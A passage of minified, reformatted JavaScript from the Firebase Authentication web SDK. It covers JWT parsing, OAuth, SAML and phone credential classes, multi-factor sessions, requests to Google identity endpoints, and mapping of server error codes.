          (b = Mk(b, "deep_link_id")), Mk(M(b), "link") || b || d || c || a
        );
      },
      jm = function (a) {
        var b = "unauthorized-domain",
          c = void 0,
          d = M(a);
        (a = d.Ga),
          "chrome-extension" == (d = d.Va)
            ? (c = Oc(
                "This chrome extension ID (chrome-extension://%s) is not authorized to run this operation. If you are the app developer, add it to the OAuth redirect domains list in the Firebase console -> Auth section -> Sign in method tab.",
                a
              ))
            : "http" == d || "https" == d
            ? (c = Oc(
                "This domain (%s) is not authorized to run this operation. If you are the app developer, add it to the OAuth redirect domains list in the Firebase console -> Auth section -> Sign in method tab.",
                a
              ))
            : (b = "operation-not-supported-in-this-environment"),
          P.call(this, b, c);
      };
    n(jm, P);
    var lm = function (a) {
      var b = km(a);
      if (!(b && b.sub && b.iss && b.aud && b.exp)) throw Error("Invalid JWT");
      (this.vl = a),
        (this.Dg = b.exp),
        (this.xl = b.sub),
        (a = Date.now() / 1e3),
        (this.jl = b.iat || (a > this.Dg ? this.Dg : a)),
        (this.Hc = b.email || null),
        (this.mh =
          b.provider_id || (b.firebase && b.firebase.sign_in_provider) || null),
        (this.ma = (b.firebase && b.firebase.tenant) || null),
        (this.lk = !!b.is_anonymous || "anonymous" == this.mh);
    };
    (lm.prototype.getEmail = function () {
      return this.Hc;
    }),
      (lm.prototype.isAnonymous = function () {
        return this.lk;
      }),
      (lm.prototype.toString = function () {
        return this.vl;
      });
    var mm = function (a) {
        try {
          return new lm(a);
        } catch (b) {
          return null;
        }
      },
      km = function (a) {
        if (!a) return null;
        if (3 != (a = a.split(".")).length) return null;
        for (var b = (4 - ((a = a[1]).length % 4)) % 4, c = 0; c < b; c++)
          a += ".";
        try {
          var d = Ni(a);
          for (a = [], c = b = 0; b < d.length; ) {
            var e = d[b++];
            if (128 > e) a[c++] = String.fromCharCode(e);
            else if (191 < e && 224 > e) {
              var f = d[b++];
              a[c++] = String.fromCharCode(((31 & e) << 6) | (63 & f));
            } else if (239 < e && 365 > e) {
              f = d[b++];
              var g = d[b++],
                l =
                  (((7 & e) << 18) |
                    ((63 & f) << 12) |
                    ((63 & g) << 6) |
                    (63 & d[b++])) -
                  65536;
              (a[c++] = String.fromCharCode(55296 + (l >> 10))),
                (a[c++] = String.fromCharCode(56320 + (1023 & l)));
            } else
              (f = d[b++]),
                (g = d[b++]),
                (a[c++] = String.fromCharCode(
                  ((15 & e) << 12) | ((63 & f) << 6) | (63 & g)
                ));
          }
          return JSON.parse(a.join(""));
        } catch (m) {}
        return null;
      },
      nm = function (a) {
        var b = km(a);
        if (!(b && b.exp && b.auth_time && b.iat))
          throw new P(
            "internal-error",
            "An internal error occurred. The token obtained by Firebase appears to be malformed. Please retry the operation."
          );
        Pl(this, {
          token: a,
          expirationTime: Hl(1e3 * b.exp),
          authTime: Hl(1e3 * b.auth_time),
          issuedAtTime: Hl(1e3 * b.iat),
          signInProvider:
            b.firebase && b.firebase.sign_in_provider
              ? b.firebase.sign_in_provider
              : null,
          signInSecondFactor:
            b.firebase && b.firebase.sign_in_second_factor
              ? b.firebase.sign_in_second_factor
              : null,
          claims: b,
        });
      },
      om = function (a, b) {
        if (!a && !b)
          throw new P(
            "internal-error",
            "Internal assert: no raw session string available"
          );
        if (a && b)
          throw new P(
            "internal-error",
            "Internal assert: unable to determine the session type"
          );
        (this.ef = a || null),
          (this.Zi = b || null),
          (this.type = this.ef ? "enroll" : "signin");
      };
    (om.prototype.Zd = function () {
      return this.ef ? F(this.ef) : F(this.Zi);
    }),
      (om.prototype.T = function () {
        return "enroll" == this.type
          ? { multiFactorSession: { idToken: this.ef } }
          : { multiFactorSession: { pendingCredential: this.Zi } };
      });
    var pm = function () {};
    (pm.prototype.Kc = function () {}),
      (pm.prototype.ud = function () {}),
      (pm.prototype.ke = function () {}),
      (pm.prototype.T = function () {});
    var qm = function (a, b) {
        return a
          .then(function (c) {
            if (c.idToken) {
              var d = mm(c.idToken);
              if (!d || b != d.xl) throw new P("user-mismatch");
              return c;
            }
            throw new P("user-mismatch");
          })
          .l(function (c) {
            throw c && c.code && "auth/user-not-found" == c.code
              ? new P("user-mismatch")
              : c;
          });
      },
      rm = function (a, b) {
        if (!b)
          throw new P("internal-error", "failed to construct a credential");
        (this.Xb = b), O(this, "providerId", a), O(this, "signInMethod", a);
      };
    (k = rm.prototype),
      (k.Kc = function (a) {
        return sm(a, this.Oc());
      }),
      (k.ud = function (a, b) {
        var c = this.Oc();
        return (c.idToken = b), tm(a, c);
      }),
      (k.ke = function (a, b) {
        var c = this.Oc();
        return qm(um(a, c), b);
      }),
      (k.Oc = function () {
        return { pendingToken: this.Xb, requestUri: "http://localhost" };
      }),
      (k.T = function () {
        return {
          providerId: this.providerId,
          signInMethod: this.signInMethod,
          pendingToken: this.Xb,
        };
      });
    var vm = function (a) {
        if (
          a &&
          a.providerId &&
          a.signInMethod &&
          0 == a.providerId.indexOf("saml.") &&
          a.pendingToken
        )
          try {
            return new rm(a.providerId, a.pendingToken);
          } catch (b) {}
        return null;
      },
      wm = function (a, b, c) {
        if (((this.Xb = null), b.idToken || b.accessToken))
          b.idToken && O(this, "idToken", b.idToken),
            b.accessToken && O(this, "accessToken", b.accessToken),
            b.nonce && !b.pendingToken && O(this, "nonce", b.nonce),
            b.pendingToken && (this.Xb = b.pendingToken);
        else {
          if (!b.oauthToken || !b.oauthTokenSecret)
            throw new P("internal-error", "failed to construct a credential");
          O(this, "accessToken", b.oauthToken),
            O(this, "secret", b.oauthTokenSecret);
        }
        O(this, "providerId", a), O(this, "signInMethod", c);
      };
    (k = wm.prototype),
      (k.Kc = function (a) {
        return sm(a, this.Oc());
      }),
      (k.ud = function (a, b) {
        var c = this.Oc();
        return (c.idToken = b), tm(a, c);
      }),
      (k.ke = function (a, b) {
        var c = this.Oc();
        return qm(um(a, c), b);
      }),
      (k.Oc = function () {
        var a = {};
        return (
          this.idToken && (a.id_token = this.idToken),
          this.accessToken && (a.access_token = this.accessToken),
          this.secret && (a.oauth_token_secret = this.secret),
          (a.providerId = this.providerId),
          this.nonce && !this.Xb && (a.nonce = this.nonce),
          (a = { postBody: Qk(a).toString(), requestUri: "http://localhost" }),
          this.Xb && (delete a.postBody, (a.pendingToken = this.Xb)),
          a
        );
      }),
      (k.T = function () {
        var a = {
          providerId: this.providerId,
          signInMethod: this.signInMethod,
        };
        return (
          this.idToken && (a.oauthIdToken = this.idToken),
          this.accessToken && (a.oauthAccessToken = this.accessToken),
          this.secret && (a.oauthTokenSecret = this.secret),
          this.nonce && (a.nonce = this.nonce),
          this.Xb && (a.pendingToken = this.Xb),
          a
        );
      });
    var xm = function (a) {
        if (a && a.providerId && a.signInMethod) {
          var b = {
            idToken: a.oauthIdToken,
            accessToken: a.oauthTokenSecret ? null : a.oauthAccessToken,
            oauthTokenSecret: a.oauthTokenSecret,
            oauthToken: a.oauthTokenSecret && a.oauthAccessToken,
            nonce: a.nonce,
            pendingToken: a.pendingToken,
          };
          try {
            return new wm(a.providerId, b, a.signInMethod);
          } catch (c) {}
        }
        return null;
      },
      ym = function (a, b) {
        (this.Tl = b || []),
          Pl(this, { providerId: a, isOAuthProvider: !0 }),
          (this.fi = {}),
          (this.Sg = (Wl(a) || {}).he || null),
          (this.xg = null);
      };
    ym.prototype.setCustomParameters = function (a) {
      return (this.fi = Za(a)), this;
    };
    var zm = function (a) {
      if ("string" != typeof a || 0 != a.indexOf("saml."))
        throw new P(
          "argument-error",
          'SAML provider IDs must be prefixed with "saml."'
        );
      ym.call(this, a, []);
    };
    v(zm, ym);
    var Am = function (a) {
      ym.call(this, a, Ul), (this.xh = []);
    };
    v(Am, ym),
      (Am.prototype.addScope = function (a) {
        return Qa(this.xh, a) || this.xh.push(a), this;
      }),
      (Am.prototype.zi = function () {
        return Ua(this.xh);
      }),
      (Am.prototype.credential = function (a, b) {
        if (
          !(a = t(a)
            ? {
                idToken: a.idToken || null,
                accessToken: a.accessToken || null,
                nonce: a.rawNonce || null,
              }
            : { idToken: a || null, accessToken: b || null }).idToken &&
          !a.accessToken
        )
          throw new P(
            "argument-error",
            "credential failed: must provide the ID token and/or the access token."
          );
        return new wm(this.providerId, a, this.providerId);
      });
    var Bm = function () {
      Am.call(this, "facebook.com");
    };
    v(Bm, Am),
      O(Bm, "PROVIDER_ID", "facebook.com"),
      O(Bm, "FACEBOOK_SIGN_IN_METHOD", "facebook.com");
    var Cm = function (a) {
        if (!a)
          throw new P(
            "argument-error",
            "credential failed: expected 1 argument (the OAuth access token)."
          );
        var b = a;
        return (
          t(a) && (b = a.accessToken), new Bm().credential({ accessToken: b })
        );
      },
      Dm = function () {
        Am.call(this, "github.com");
      };
    v(Dm, Am),
      O(Dm, "PROVIDER_ID", "github.com"),
      O(Dm, "GITHUB_SIGN_IN_METHOD", "github.com");
    var Em = function (a) {
        if (!a)
          throw new P(
            "argument-error",
            "credential failed: expected 1 argument (the OAuth access token)."
          );
        var b = a;
        return (
          t(a) && (b = a.accessToken), new Dm().credential({ accessToken: b })
        );
      },
      Fm = function () {
        Am.call(this, "google.com"), this.addScope("profile");
      };
    v(Fm, Am),
      O(Fm, "PROVIDER_ID", "google.com"),
      O(Fm, "GOOGLE_SIGN_IN_METHOD", "google.com");
    var Gm = function (a, b) {
        var c = a;
        return (
          t(a) && ((c = a.idToken), (b = a.accessToken)),
          new Fm().credential({ idToken: c, accessToken: b })
        );
      },
      Hm = function () {
        ym.call(this, "twitter.com", Tl);
      };
    v(Hm, ym),
      O(Hm, "PROVIDER_ID", "twitter.com"),
      O(Hm, "TWITTER_SIGN_IN_METHOD", "twitter.com");
    var Im = function (a, b) {
        var c = a;
        if (
          (t(c) || (c = { oauthToken: a, oauthTokenSecret: b }),
          !c.oauthToken || !c.oauthTokenSecret)
        )
          throw new P(
            "argument-error",
            "credential failed: expected 2 arguments (the OAuth access token and secret)."
          );
        return new wm("twitter.com", c, "twitter.com");
      },
      Km = function (a, b, c) {
        (this.Hc = a),
          (this.le = b),
          O(this, "providerId", "password"),
          O(
            this,
            "signInMethod",
            c === Jm.EMAIL_LINK_SIGN_IN_METHOD
              ? Jm.EMAIL_LINK_SIGN_IN_METHOD
              : Jm.EMAIL_PASSWORD_SIGN_IN_METHOD
          );
      };
    (Km.prototype.Kc = function (a) {
      return this.signInMethod == Jm.EMAIL_LINK_SIGN_IN_METHOD
        ? Q(a, Lm, { email: this.Hc, oobCode: this.le })
        : Q(a, Mm, { email: this.Hc, password: this.le });
    }),
      (Km.prototype.ud = function (a, b) {
        return this.signInMethod == Jm.EMAIL_LINK_SIGN_IN_METHOD
          ? Q(a, Nm, { idToken: b, email: this.Hc, oobCode: this.le })
          : Q(a, Om, { idToken: b, email: this.Hc, password: this.le });
      }),
      (Km.prototype.ke = function (a, b) {
        return qm(this.Kc(a), b);
      }),
      (Km.prototype.T = function () {
        return {
          email: this.Hc,
          password: this.le,
          signInMethod: this.signInMethod,
        };
      });
    var Pm = function (a) {
        return a && a.email && a.password
          ? new Km(a.email, a.password, a.signInMethod)
          : null;
      },
      Jm = function () {
        Pl(this, { providerId: "password", isOAuthProvider: !1 });
      },
      Rm = function (a, b) {
        if (!(b = Qm(b))) throw new P("argument-error", "Invalid email link!");
        return new Km(a, b.code, Jm.EMAIL_LINK_SIGN_IN_METHOD);
      },
      Qm = function (a) {
        return (
          (a = im(a)), (a = hm(a)) && "EMAIL_SIGNIN" === a.operation ? a : null
        );
      };
    Pl(Jm, { PROVIDER_ID: "password" }),
      Pl(Jm, { EMAIL_LINK_SIGN_IN_METHOD: "emailLink" }),
      Pl(Jm, { EMAIL_PASSWORD_SIGN_IN_METHOD: "password" });
    var Sm = function (a) {
      if (!((a.verificationId && a.Wf) || (a.De && a.phoneNumber)))
        throw new P("internal-error");
      (this.wa = a),
        O(this, "providerId", "phone"),
        (this.providerId = "phone"),
        O(this, "signInMethod", "phone");
    };
    (Sm.prototype.Kc = function (a) {
      return a.verifyPhoneNumber(Tm(this));
    }),
      (Sm.prototype.ud = function (a, b) {
        var c = Tm(this);
        return (c.idToken = b), Q(a, Um, c);
      }),
      (Sm.prototype.ke = function (a, b) {
        var c = Tm(this);
        return (c.operation = "REAUTH"), (a = Q(a, Vm, c)), qm(a, b);
      }),
      (Sm.prototype.T = function () {
        var a = { providerId: "phone" };
        return (
          this.wa.verificationId && (a.verificationId = this.wa.verificationId),
          this.wa.Wf && (a.verificationCode = this.wa.Wf),
          this.wa.De && (a.temporaryProof = this.wa.De),
          this.wa.phoneNumber && (a.phoneNumber = this.wa.phoneNumber),
          a
        );
      });
    var Wm = function (a) {
        if (
          a &&
          "phone" === a.providerId &&
          ((a.verificationId && a.verificationCode) ||
            (a.temporaryProof && a.phoneNumber))
        ) {
          var b = {};
          return (
            x(
              [
                "verificationId",
                "verificationCode",
                "temporaryProof",
                "phoneNumber",
              ],
              function (c) {
                a[c] && (b[c] = a[c]);
              }
            ),
            new Sm(b)
          );
        }
        return null;
      },
      Tm = function (a) {
        return a.wa.De && a.wa.phoneNumber
          ? { temporaryProof: a.wa.De, phoneNumber: a.wa.phoneNumber }
          : { sessionInfo: a.wa.verificationId, code: a.wa.Wf };
      },
      Xm = function (a) {
        try {
          this.Me = a || firebase.auth();
        } catch (b) {
          throw new P(
            "argument-error",
            "Either an instance of firebase.auth.Auth must be passed as an argument to the firebase.auth.PhoneAuthProvider constructor, or the default firebase App instance must be initialized via firebase.initializeApp()."
          );
        }
        Pl(this, { providerId: "phone", isOAuthProvider: !1 });
      };
    Xm.prototype.verifyPhoneNumber = function (a, b) {
      var c = this.Me.o;
      return F(b.verify()).then(function (d) {
        if ("string" != typeof d)
          throw new P(
            "argument-error",
            "An implementation of firebase.auth.ApplicationVerifier.prototype.verify() must return a firebase.Promise that resolves with a string."
          );
        if ("recaptcha" === b.type) {
          var e = t(a) ? a.session : null,
            f = t(a) ? a.phoneNumber : a;
          return (
            e && "enroll" == e.type
              ? e.Zd().then(function (g) {
                  return Ym(c, {
                    idToken: g,
                    phoneEnrollmentInfo: { phoneNumber: f, recaptchaToken: d },
                  });
                })
              : e && "signin" == e.type
              ? e.Zd().then(function (g) {
                  return Zm(c, {
                    mfaPendingCredential: g,
                    mfaEnrollmentId:
                      (a.multiFactorHint && a.multiFactorHint.uid) ||
                      a.multiFactorUid,
                    phoneSignInInfo: { recaptchaToken: d },
                  });
                })
              : $m(c, { phoneNumber: f, recaptchaToken: d })
          ).then(
            function (g) {
              return "function" == typeof b.reset && b.reset(), g;
            },
            function (g) {
              throw ("function" == typeof b.reset && b.reset(), g);
            }
          );
        }
        throw new P(
          "argument-error",
          'Only firebase.auth.ApplicationVerifiers with type="recaptcha" are currently supported.'
        );
      });
    };
    var an = function (a, b) {
      if (!a) throw new P("missing-verification-id");
      if (!b) throw new P("missing-verification-code");
      return new Sm({ verificationId: a, Wf: b });
    };
    Pl(Xm, { PROVIDER_ID: "phone" }), Pl(Xm, { PHONE_SIGN_IN_METHOD: "phone" });
    var bn = function (a) {
        if (a.temporaryProof && a.phoneNumber)
          return new Sm({ De: a.temporaryProof, phoneNumber: a.phoneNumber });
        var b = a && a.providerId;
        if (!b || "password" === b) return null;
        var c = a && a.oauthAccessToken,
          d = a && a.oauthTokenSecret,
          e = a && a.nonce,
          f = a && a.oauthIdToken,
          g = a && a.pendingToken;
        try {
          switch (b) {
            case "google.com":
              return Gm(f, c);
            case "facebook.com":
              return Cm(c);
            case "github.com":
              return Em(c);
            case "twitter.com":
              return Im(c, d);
            default:
              return c || d || f || g
                ? g
                  ? 0 == b.indexOf("saml.")
                    ? new rm(b, g)
                    : new wm(
                        b,
                        {
                          pendingToken: g,
                          idToken: a.oauthIdToken,
                          accessToken: a.oauthAccessToken,
                        },
                        b
                      )
                  : new Am(b).credential({
                      idToken: f,
                      accessToken: c,
                      rawNonce: e,
                    })
                : null;
          }
        } catch (h) {
          return null;
        }
      },
      cn = function (a) {
        if (!a.isOAuthProvider) throw new P("invalid-oauth-provider");
      },
      dn = function (a, b, c) {
        P.call(this, a, c),
          (a = b || {}).email && O(this, "email", a.email),
          a.phoneNumber && O(this, "phoneNumber", a.phoneNumber),
          a.credential && O(this, "credential", a.credential),
          a.tenantId && O(this, "tenantId", a.tenantId);
      };
    n(dn, P),
      (dn.prototype.T = function () {
        var a = { code: this.code, message: this.message };
        this.email && (a.email = this.email),
          this.phoneNumber && (a.phoneNumber = this.phoneNumber),
          this.tenantId && (a.tenantId = this.tenantId);
        var b = this.credential && this.credential.T();
        return b && ab(a, b), a;
      }),
      (dn.prototype.toJSON = function () {
        return this.T();
      });
    var en = function (a) {
        if (a.code) {
          var b = a.code || "";
          0 == b.indexOf("auth/") && (b = b.substring(5));
          var c = { credential: bn(a), tenantId: a.tenantId };
          if (a.email) c.email = a.email;
          else if (a.phoneNumber) c.phoneNumber = a.phoneNumber;
          else if (!c.credential) return new P(b, a.message || void 0);
          return new dn(b, c, a.message);
        }
        return null;
      },
      fn = ha(["https://apis.google.com/js/client.js?onload=", ""]),
      gn = function (a) {
        this.Dm = a;
      };
    n(gn, Bj),
      (gn.prototype.Sd = function () {
        return new this.Dm();
      }),
      (gn.prototype.mf = function () {
        return {};
      });
    var mn = function (a, b, c) {
        if (
          ((this.ha = a),
          (b = b || {}),
          (this.Cj =
            b.secureTokenEndpoint ||
            "https://securetoken.googleapis.com/v1/token"),
          (this.km = b.secureTokenTimeout || hn),
          (this.Mf = Za(b.secureTokenHeaders || jn)),
          (this.ri =
            b.firebaseEndpoint ||
            "https://www.googleapis.com/identitytoolkit/v3/relyingparty/"),
          (this.Ii =
            b.identityPlatformEndpoint ||
            "https://identitytoolkit.googleapis.com/v2/"),
          (this.Jk = b.firebaseTimeout || kn),
          (this.ld = Za(b.firebaseHeaders || ln)),
          c &&
            ((this.ld["X-Client-Version"] = c),
            (this.Mf["X-Client-Version"] = c)),
          (a = "Node" == ol()),
          !(a =
            p.XMLHttpRequest ||
            (a &&
              firebase.INTERNAL.node &&
              firebase.INTERNAL.node.XMLHttpRequest)) && !nl())
        )
          throw new P(
            "internal-error",
            "The XMLHttpRequest compatibility library was not found."
          );
        (this.Kf = void 0),
          nl()
            ? (this.Kf = new Ij({ Cm: self }))
            : pl()
            ? (this.Kf = new gn(a))
            : (this.Kf = new Fj()),
          (this.ma = null);
      },
      nn,
      on = function (a, b) {
        b ? (a.ld["X-Firebase-Locale"] = b) : delete a.ld["X-Firebase-Locale"];
      },
      qn = function (a, b) {
        b &&
          ((a.Cj = pn("https://securetoken.googleapis.com/v1/token", b)),
          (a.ri = pn(
            "https://www.googleapis.com/identitytoolkit/v3/relyingparty/",
            b
          )),
          (a.Ii = pn("https://identitytoolkit.googleapis.com/v2/", b)));
      },
      pn = function (a, b) {
        return (
          (a = M(a)),
          (b = M(b.url)),
          a.setPath(a.Ga + a.getPath()),
          zk(a, b.Va),
          Bk(a, b.Ga),
          Ck(a, b.Tb),
          a.toString()
        );
      },
      rn = function (a, b) {
        b
          ? ((a.ld["X-Client-Version"] = b), (a.Mf["X-Client-Version"] = b))
          : (delete a.ld["X-Client-Version"], delete a.Mf["X-Client-Version"]);
      },
      tn = function (a, b, c, d, e, f, g) {
        al() || nl()
          ? (a = u(a.mm, a))
          : (nn ||
              (nn = new E(function (h, l) {
                sn(h, l);
              })),
            (a = u(a.lm, a))),
          a(b, c, d, e, f, g);
      };
    mn.prototype.mm = function (a, b, c, d, e, f) {
      if (
        nl() &&
        (void 0 === p.fetch || void 0 === p.Headers || void 0 === p.Request)
      )
        throw new P(
          "operation-not-supported-in-this-environment",
          "fetch, Headers and Request native APIs or equivalent Polyfills must be available to support HTTP requests from a Worker environment."
        );
      var g = new K(this.Kf);
      if (f) {
        g.Jd = Math.max(0, f);
        var h = setTimeout(function () {
          g.dispatchEvent("timeout");
        }, f);
      }
      g.listen("complete", function () {
        h && clearTimeout(h);
        var l = null;
        try {
          var m = JSON,
            q = m.parse;
          try {
            var y = this.u ? this.u.responseText : "";
          } catch (B) {
            Id(this.Da, "Can not get responseText: " + B.message), (y = "");
          }
          l = q.call(m, y) || null;
        } catch (B) {
          l = null;
        }
        b && b(l);
      }),
        uj(g, "ready", function () {
          h && clearTimeout(h), this.Gc();
        }),
        uj(g, "timeout", function () {
          h && clearTimeout(h), this.Gc(), b && b(null);
        }),
        g.send(a, c, d, e);
    };
    var sn = function (a, b) {
      if (((window.gapi || {}).client || {}).request) a();
      else {
        p[un] = function () {
          ((window.gapi || {}).client || {}).request
            ? a()
            : b(Error("CORS_UNSUPPORTED"));
        };
        var c = nc(fn, un);
        Xj(gk(c), function () {
          b(Error("CORS_UNSUPPORTED"));
        });
      }
    };
    mn.prototype.lm = function (a, b, c, d, e) {
      var f = this;
      nn.then(function () {
        window.gapi.client.setApiKey(f.ha);
        var g = window.gapi.auth.getToken();
        window.gapi.auth.setToken(null),
          window.gapi.client.request({
            path: a,
            method: c,
            body: d,
            headers: e,
            authType: "none",
            callback: function (h) {
              window.gapi.auth.setToken(g), b && b(h);
            },
          });
      }).l(function (g) {
        b && b({ error: { message: (g && g.message) || "CORS_UNSUPPORTED" } });
      });
    };
    var wn = function (a, b) {
        return new E(function (c, d) {
          ("refresh_token" == b.grant_type && b.refresh_token) ||
          ("authorization_code" == b.grant_type && b.code)
            ? tn(
                a,
                a.Cj + "?key=" + encodeURIComponent(a.ha),
                function (e) {
                  e
                    ? e.error
                      ? d(vn(e))
                      : e.access_token && e.refresh_token
                      ? c(e)
                      : d(new P("internal-error"))
                    : d(new P("network-request-failed"));
                },
                "POST",
                Qk(b).toString(),
                a.Mf,
                a.km.get()
              )
            : d(new P("internal-error"));
        });
      },
      xn = function (a, b, c, d, e, f, g) {
        var h = M(b + c);
        L(h, "key", a.ha), g && L(h, "cb", Date.now().toString());
        var l = "GET" == d;
        if (l) for (var m in e) e.hasOwnProperty(m) && L(h, m, e[m]);
        return new E(function (q, y) {
          tn(
            a,
            h.toString(),
            function (B) {
              B
                ? B.error
                  ? y(vn(B, f || {}))
                  : q(B)
                : y(new P("network-request-failed"));
            },
            d,
            l ? void 0 : JSON.stringify(zl(e)),
            a.ld,
            a.Jk.get()
          );
        });
      },
      yn = function (a) {
        if ("string" != typeof (a = a.email) || !hl.test(a))
          throw new P("invalid-email");
      },
      zn = function (a) {
        "email" in a && yn(a);
      },
      Bn = function (a, b) {
        return Q(a, An, {
          identifier: b,
          continueUri: vl() ? Xk() : "http://localhost",
        }).then(function (c) {
          return c.signinMethods || [];
        });
      },
      Dn = function (a) {
        return Q(a, Cn, {}).then(function (b) {
          return b.authorizedDomains || [];
        });
      },
      En = function (a) {
        if (!a.idToken) {
          if (a.mfaPendingCredential)
            throw new P("multi-factor-auth-required", null, Za(a));
          throw new P("internal-error");
        }
      },
      Fn = function (a) {
        if (a.phoneNumber || a.temporaryProof) {
          if (!a.phoneNumber || !a.temporaryProof)
            throw new P("internal-error");
        } else {
          if (!a.sessionInfo) throw new P("missing-verification-id");
          if (!a.code) throw new P("missing-verification-code");
        }
      };
    (k = mn.prototype),
      (k.signInAnonymously = function () {
        return Q(this, Gn, {});
      }),
      (k.updateEmail = function (a, b) {
        return Q(this, Hn, { idToken: a, email: b });
      }),
      (k.updatePassword = function (a, b) {
        return Q(this, Om, { idToken: a, password: b });
      }),
      (k.updateProfile = function (a, b) {
        var c = { idToken: a },
          d = [];
        return (
          Wa(In, function (e, f) {
            var g = b[f];
            null === g ? d.push(e) : f in b && (c[f] = g);
          }),
          d.length && (c.deleteAttribute = d),
          Q(this, Hn, c)
        );
      }),
      (k.sendPasswordResetEmail = function (a, b) {
        return (
          ab((a = { requestType: "PASSWORD_RESET", email: a }), b),
          Q(this, Jn, a)
        );
      }),
      (k.sendSignInLinkToEmail = function (a, b) {
        return (
          ab((a = { requestType: "EMAIL_SIGNIN", email: a }), b), Q(this, Kn, a)
        );
      }),
      (k.sendEmailVerification = function (a, b) {
        return (
          ab((a = { requestType: "VERIFY_EMAIL", idToken: a }), b),
          Q(this, Ln, a)
        );
      }),
      (k.verifyBeforeUpdateEmail = function (a, b, c) {
        return (
          ab(
            (a = {
              requestType: "VERIFY_AND_CHANGE_EMAIL",
              idToken: a,
              newEmail: b,
            }),
            c
          ),
          Q(this, Mn, a)
        );
      });
    var $m = function (a, b) {
      return Q(a, Nn, b);
    };
    mn.prototype.verifyPhoneNumber = function (a) {
      return Q(this, On, a);
    };
    var Ym = function (a, b) {
        return Q(a, Pn, b).then(function (c) {
          return c.phoneSessionInfo.sessionInfo;
        });
      },
      Qn = function (a) {
        if (!a.phoneVerificationInfo) throw new P("internal-error");
        if (!a.phoneVerificationInfo.sessionInfo)
          throw new P("missing-verification-id");
        if (!a.phoneVerificationInfo.code)
          throw new P("missing-verification-code");
      },
      Zm = function (a, b) {
        return Q(a, Rn, b).then(function (c) {
          return c.phoneResponseInfo.sessionInfo;
        });
      },
      Tn = function (a, b, c) {
        return Q(a, Sn, { idToken: b, deleteProvider: c });
      },
      Un = function (a) {
        if (!a.requestUri || (!a.sessionId && !a.postBody && !a.pendingToken))
          throw new P("internal-error");
      },
      Vn = function (a, b) {
        return (
          b.oauthIdToken &&
            b.providerId &&
            0 == b.providerId.indexOf("oidc.") &&
            !b.pendingToken &&
            (a.sessionId
              ? (b.nonce = a.sessionId)
              : a.postBody &&
                ((a = new Fk(a.postBody)),
                Rk(a, "nonce") && (b.nonce = a.get("nonce")))),
          b
        );
      },
      Xn = function (a) {
        var b = null;
        if (
          (a.needConfirmation
            ? ((a.code = "account-exists-with-different-credential"),
              (b = en(a)))
            : "FEDERATED_USER_ID_ALREADY_LINKED" == a.errorMessage
            ? ((a.code = "credential-already-in-use"), (b = en(a)))
            : "EMAIL_EXISTS" == a.errorMessage
            ? ((a.code = "email-already-in-use"), (b = en(a)))
            : a.errorMessage && (b = Wn(a.errorMessage)),
          b)
        )
          throw b;
        En(a);
      },
      sm = function (a, b) {
        return (b.returnIdpCredential = !0), Q(a, Yn, b);
      },
      tm = function (a, b) {
        return (b.returnIdpCredential = !0), Q(a, Zn, b);
      },
      um = function (a, b) {
        return (b.returnIdpCredential = !0), (b.autoCreate = !1), Q(a, $n, b);
      },
      ao = function (a) {
        if (!a.oobCode) throw new P("invalid-action-code");
      };
    (mn.prototype.confirmPasswordReset = function (a, b) {
      return Q(this, bo, { oobCode: a, newPassword: b });
    }),
      (mn.prototype.checkActionCode = function (a) {
        return Q(this, co, { oobCode: a });
      }),
      (mn.prototype.applyActionCode = function (a) {
        return Q(this, eo, { oobCode: a });
      });
    var Q = function (a, b, c) {
        if (!Rl(c, b.Ma)) return G(new P("internal-error"));
        var f,
          d = !!b.He,
          e = b.httpMethod || "POST";
        return F(c)
          .then(b.oa)
          .then(function () {
            return (
              b.Mb && (c.returnSecureToken = !0),
              b.ta && a.ma && void 0 === c.tenantId && (c.tenantId = a.ma),
              xn(a, d ? a.Ii : a.ri, b.endpoint, e, c, b.ei, b.ng || !1)
            );
          })
          .then(function (g) {
            return (f = g), b.Hf ? b.Hf(c, f) : f;
          })
          .then(b.Aa)
          .then(function () {
            if (!b.Zb) return f;
            if (!(b.Zb in f)) throw new P("internal-error");
            return f[b.Zb];
          });
      },
      Wn = function (a) {
        return vn({
          error: { errors: [{ message: a }], code: 400, reason: a },
        });
      },
      vn = function (a, b) {
        var c =
            ((a.error && a.error.errors && a.error.errors[0]) || {}).reason ||
            "",
          d = {
            keyInvalid: "invalid-api-key",
            ipRefererBlocked: "app-not-authorized",
          };
        if ((c = d[c] ? new P(d[c]) : null)) return c;
        for (var e in ((c =
          (a.error && (a.error.reason || a.error.message)) || ""),
        ab(
          (d = {
            INVALID_CUSTOM_TOKEN: "invalid-custom-token",
            CREDENTIAL_MISMATCH: "custom-token-mismatch",
            MISSING_CUSTOM_TOKEN: "internal-error",
            INVALID_IDENTIFIER: "invalid-email",
            MISSING_CONTINUE_URI: "internal-error",
            INVALID_EMAIL: "invalid-email",
            INVALID_PASSWORD: "wrong-password",
            USER_DISABLED: "user-disabled",
            MISSING_PASSWORD: "internal-error",
            EMAIL_EXISTS: "email-already-in-use",
            PASSWORD_LOGIN_DISABLED: "operation-not-allowed",
            INVALID_IDP_RESPONSE: "invalid-credential",
            INVALID_PENDING_TOKEN: "invalid-credential",
            FEDERATED_USER_ID_ALREADY_LINKED: "credential-already-in-use",
            MISSING_OR_INVALID_NONCE: "missing-or-invalid-nonce",
            INVALID_MESSAGE_PAYLOAD: "invalid-message-payload",
            INVALID_RECIPIENT_EMAIL: "invalid-recipient-email",
            INVALID_SENDER: "invalid-sender",
            EMAIL_NOT_FOUND: "user-not-found",
            RESET_PASSWORD_EXCEED_LIMIT: "too-many-requests",
            EXPIRED_OOB_CODE: "expired-action-code",
            INVALID_OOB_CODE: "invalid-action-code",
            MISSING_OOB_CODE: "internal-error",
            INVALID_PROVIDER_ID: "invalid-provider-id",
            CREDENTIAL_TOO_OLD_LOGIN_AGAIN: "requires-recent-login",
            INVALID_ID_TOKEN: "invalid-user-token",
            TOKEN_EXPIRED: "user-token-expired",
            USER_NOT_FOUND: "user-token-expired",
            CORS_UNSUPPORTED: "cors-unsupported",
            DYNAMIC_LINK_NOT_ACTIVATED: "dynamic-link-not-activated",
            INVALID_APP_ID: "invalid-app-id",
            TOO_MANY_ATTEMPTS_TRY_LATER: "too-many-requests",
            WEAK_PASSWORD: "weak-password",
            PASSWORD_DOES_NOT_MEET_REQUIREMENTS:
              "password-does-not-meet-requirements",
            OPERATION_NOT_ALLOWED: "operation-not-allowed",
            USER_CANCELLED: "user-cancelled",
            CAPTCHA_CHECK_FAILED: "captcha-check-failed",
            INVALID_APP_CREDENTIAL: "invalid-app-credential",
            INVALID_CODE: "invalid-verification-code",
